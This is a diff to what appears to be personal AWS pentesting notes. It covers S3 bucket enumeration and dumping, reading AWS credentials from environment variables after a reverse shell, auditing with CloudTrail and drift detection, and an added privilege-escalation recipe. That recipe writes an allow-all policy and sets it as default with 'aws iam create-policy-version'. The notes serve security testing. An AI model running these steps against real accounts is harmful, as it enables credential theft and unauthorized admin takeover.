@@ -37,7 +37,6 @@ Check attached IAM policies, and group inheritance: <br/>
 
 ## AWS pentesting 
 
-
 1. Enum S3 dirs like normal, might have .git repos, jenkins etc, use `aws s3 sync` to get bucket (if dumping PII is within scope). 
 2. Look for eg cloud formation templates to see what the user or IAM role has access to. 
 3. When a rev shell is obtained, run `env | grep AWS` to grab aws creds and/or `printenv` for containers. 
@@ -49,11 +48,30 @@ Check attached IAM policies, and group inheritance: <br/>
 **Auditing**: <br/> 
 Use AWS security hub, IAM access analyzer, config to validate least privileges when mapping services to identities; <br/> 
 Check CloudTrail logging for IAM role/policy changes, backdoor users created etc; <br/> 
-Check if drift detection alerts are enabled if using terraform, eg admin policies added to random IAM roles. 
+Check if drift detection alerts are enabled if using terraform, eg admin policies added to random IAM roles. <br/><br/> 
+
 
 **Privilege Escalation**: <br/> 
-Check if any role has `iam:PassRole`, if a service can be configured to use those roles, and if admin permissions can be attached. 
-
+Check if any role has `iam:PassRole`, if a service can be configured use role eg `lambda:CreateFunction`, and if admin permissions can be attached. <br/> 
+Check if there's `iam:CreateAccessKey` on *, or `iam:CreatePolicyVersion`. (Try Pacu or enumerate-iam.py) 
+```json 
+ "Effect": "Allow",
+ "Action": ["iam:CreatePolicyVersion"],
+ "Resource": "arn:aws:iam::*:policy/my-policy-only"
+```
+```bash
+ # 1. Craft the malicious policy document locally
+ cat > admin-policy.json << 'EOF'
+ {
+  "Version": "2012-10-17",
+  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+ }
+ EOF
+```
+```bash
+ # 2. Create the new version AND set it active in one call
+ aws iam create-policy-version --policy-arn arn:aws:iam::<account-id>:policy/my-policy-only --policy-document file://admin-policy.json --set-as-default
+```
 
 ---- 
 
